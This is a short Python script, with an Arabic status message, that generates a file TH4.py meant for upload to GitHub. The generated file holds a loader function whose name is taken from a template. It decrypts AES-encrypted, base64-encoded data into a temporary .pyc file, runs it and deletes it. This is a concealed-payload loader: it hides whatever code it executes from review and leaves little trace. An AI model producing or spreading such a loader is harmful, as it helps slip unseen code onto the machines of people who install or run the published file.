decrypt_func_name = open("TH4_template.txt").read().strip()

code = f"""
import base64, tempfile, runpy, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def {decrypt_func_name}(data_b64, key_b64, iv_b64):
    data = base64.b64decode(data_b64)
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(data), AES.block_size)

    with tempfile.NamedTemporaryFile(delete=False, suffix=".pyc") as f:
        f.write(decrypted)
        path = f.name

    runpy.run_path(path)
    os.unlink(path)
"""

with open("TH4.py", "w", encoding="utf-8") as f:
    f.write(code)

print("تم إنشاء TH4.py، جاهز للرفع على GitHub")
